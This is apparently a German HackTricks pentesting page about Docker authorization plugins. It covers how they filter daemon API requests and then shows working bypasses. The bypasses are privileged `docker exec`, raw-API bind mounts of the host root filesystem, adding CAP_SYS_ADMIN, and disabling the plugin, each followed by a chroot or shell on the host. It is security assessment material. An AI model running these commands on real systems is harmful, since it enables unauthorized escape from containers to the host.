# Runtime-Autorisierungs-Plugins

{{#include ../../../banners/hacktricks-training.md}}

## Überblick

Runtime-Autorisierungs-Plugins sind eine zusätzliche Richtlinienebene, die entscheidet, ob ein Aufrufer eine bestimmte Daemon-Aktion ausführen darf. Docker ist das klassische Beispiel. Standardmäßig hat jeder, der mit dem Docker-Daemon kommunizieren kann, effektiv weitreichende Kontrolle darüber. Authorization-Plugins versuchen, dieses Modell einzugrenzen, indem sie den authentifizierten Benutzer und die angeforderte API-Operation prüfen und die Anfrage anschließend gemäß der Richtlinie erlauben oder ablehnen.

Dieses Thema verdient eine eigene Seite, weil es das Exploitationsmodell verändert, wenn ein Angreifer bereits Zugriff auf eine Docker API oder auf einen Benutzer in der `docker`-Gruppe hat. In solchen Umgebungen lautet die Frage nicht mehr nur: „Kann ich den Daemon erreichen?“, sondern auch: „Ist der Daemon durch eine Autorisierungsebene abgesichert, und falls ja, kann diese Ebene durch nicht behandelte Endpoints, schwaches JSON-Parsing oder Berechtigungen zur Plugin-Verwaltung umgangen werden?“

## Funktionsweise

Wenn eine Anfrage den Docker-Daemon erreicht, kann das Autorisierungssystem den Anfragekontext an ein oder mehrere installierte Plugins weitergeben. Das Plugin sieht die Identität des authentifizierten Benutzers, die Details der Anfrage, ausgewählte Header sowie Teile des Anfrage- oder Antwort-Bodys, wenn der Content-Type dafür geeignet ist. Mehrere Plugins können verkettet werden, und der Zugriff wird nur gewährt, wenn alle Plugins die Anfrage erlauben.

Dieses Modell klingt zuverlässig, aber seine Sicherheit hängt vollständig davon ab, wie umfassend der Richtlinienautor die API verstanden hat. Ein Plugin, das `docker run --privileged` blockiert, aber `docker exec` ignoriert, alternative JSON-Schlüssel wie `Binds` auf oberster Ebene übersieht oder die Plugin-Administration erlaubt, kann ein falsches Gefühl der Einschränkung erzeugen und gleichzeitig direkte Privilege-Escalation-Pfade offenlassen.

## Häufige Plugin-Ziele

Wichtige Bereiche für die Richtlinienprüfung sind:

- Endpoints zur Container-Erstellung
- `HostConfig`-Felder wie `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` und Optionen zur gemeinsamen Nutzung von Namespaces
- Verhalten von `docker exec`
- Endpoints zur Plugin-Verwaltung
- alle Endpoints, die Runtime-Aktionen außerhalb des vorgesehenen Richtlinienmodells indirekt auslösen können

Historisch machten Beispiele wie Twists `authz`-Plugin und einfache Lern-Plugins wie `authobot` dieses Modell leicht untersuchbar, da ihre Richtliniendateien und Codepfade zeigten, wie die Zuordnung von Endpoints zu Aktionen tatsächlich implementiert wurde. Für Assessment-Arbeiten ist die wichtigste Erkenntnis, dass der Richtlinienautor die vollständige API-Oberfläche verstehen muss und nicht nur die sichtbarsten CLI-Befehle.

## Missbrauch

Das erste Ziel besteht darin, herauszufinden, was tatsächlich blockiert wird. Wenn der Daemon eine Aktion ablehnt, leakt der Fehler häufig den Plugin-Namen, was dabei hilft, die eingesetzte Kontrolle zu identifizieren:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Wenn du ein umfassenderes Endpoint-Profiling benötigst, sind Tools wie `docker_auth_profiler` nützlich, da sie die ansonsten wiederholte Aufgabe automatisieren, zu prüfen, welche API-Routen und JSON-Strukturen vom Plugin tatsächlich erlaubt werden.

Wenn die Umgebung ein benutzerdefiniertes Plugin verwendet und du mit der API interagieren kannst, ermittle, welche Objektfelder tatsächlich gefiltert werden:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Diese Prüfungen sind wichtig, weil viele Autorisierungsfehler feldspezifisch und nicht konzeptspezifisch sind. Ein Plugin kann ein CLI-Muster ablehnen, ohne die entsprechende API-Struktur vollständig zu blockieren.

### Vollständiges Beispiel: `docker exec` fügt nach der Container-Erstellung Privilegien hinzu

Eine Richtlinie, die die Erstellung privilegierter Container blockiert, aber die Erstellung nicht eingeschränkter Container zusammen mit `docker exec` erlaubt, kann dennoch umgangen werden:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Akzeptiert der daemon den zweiten Schritt, hat der Benutzer einen privilegierten interaktiven Prozess innerhalb eines Containers wiedererlangt, den der Verfasser der Policy für eingeschränkt hielt.

### Vollständiges Beispiel: Bind Mount über die Raw API

Einige fehlerhafte Policies prüfen nur eine JSON-Form. Wenn der Bind Mount des root filesystem nicht konsistent blockiert wird, kann der Host weiterhin gemountet werden:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
Dieselbe Idee kann auch unter `HostConfig` erscheinen:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
Die Auswirkung ist ein vollständiger Escape aus dem Host-Dateisystem. Das interessante Detail ist, dass der Bypass aus einer unvollständigen Richtlinienabdeckung und nicht aus einem Kernel-Bug entsteht.

### Vollständiges Beispiel: Ungeprüftes Capability-Attribut

Wenn die Policy vergisst, ein Capability-bezogenes Attribut zu filtern, kann der Angreifer einen Container erstellen, der eine gefährliche Capability zurückerlangt:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Sobald `CAP_SYS_ADMIN` oder eine ähnlich starke Capability vorhanden ist, werden viele in [capabilities.md](protections/capabilities.md) und [privileged-containers.md](privileged-containers.md) beschriebenen Breakout-Techniken zugänglich.

### Vollständiges Beispiel: Deaktivieren des Plugins

Wenn Plugin-Verwaltungsoperationen erlaubt sind, besteht der sauberste Bypass möglicherweise darin, die Kontrolle vollständig zu deaktivieren:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Dies ist ein Richtlinienfehler auf Ebene der control plane. Die Autorisierungsebene ist vorhanden, aber der Benutzer, dessen Berechtigungen sie eigentlich einschränken sollte, verfügt weiterhin über die Berechtigung, sie zu deaktivieren.

## Prüfungen

Diese Befehle sollen feststellen, ob eine Richtlinienebene vorhanden ist und ob sie vollständig oder eher oberflächlich wirkt.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Was hier interessant ist:

- Denial-Nachrichten, die einen plugin name enthalten, bestätigen eine authorization layer und verraten häufig die genaue Implementierung.
- Eine für den Angreifer sichtbare plugin list kann ausreichen, um festzustellen, ob disable- oder reconfigure-Operationen möglich sind.
- Eine Policy, die nur offensichtliche CLI-Aktionen blockiert, aber keine raw API requests, sollte als bypassable betrachtet werden, bis das Gegenteil bewiesen ist.

## Runtime-Standardeinstellungen

| Runtime / Plattform | Standardzustand | Standardverhalten | Häufige manuelle Abschwächung |
| --- | --- | --- | --- |
| Docker Engine | Standardmäßig nicht aktiviert | Der Daemon-Zugriff ist effektiv nur vollständig erlaubt oder vollständig verweigert, sofern kein authorization plugin konfiguriert ist | unvollständige plugin policy, blacklists statt allowlists, Erlauben der plugin management-Funktionen, Blind Spots auf Feldebene |
| Podman | Kein übliches direktes Äquivalent | Podman stützt sich typischerweise stärker auf Unix-Berechtigungen, rootless execution und Entscheidungen zur API-Exponierung als auf Docker-style authz plugins | breite Exponierung einer rootful Podman API, schwache Socket-Berechtigungen |
| containerd / CRI-O | Anderes Kontrollmodell | Diese Runtimes stützen sich normalerweise auf Socket-Berechtigungen, Node-Trust-Grenzen und Controls des übergeordneten Orchestrators statt auf Docker authz plugins | Einbinden des Sockets in Workloads, schwache Node-lokale Trust-Annahmen |
| Kubernetes | Verwendet authn/authz auf API-server- und kubelet-Ebene, nicht Docker authz plugins | Cluster-RBAC und Admission-Kontrollen sind die wichtigste Policy-Schicht | überbreites RBAC, schwache Admission-Policy, direktes Exponieren von kubelet- oder Runtime-APIs |

{{#include ../../../banners/hacktricks-training.md}}
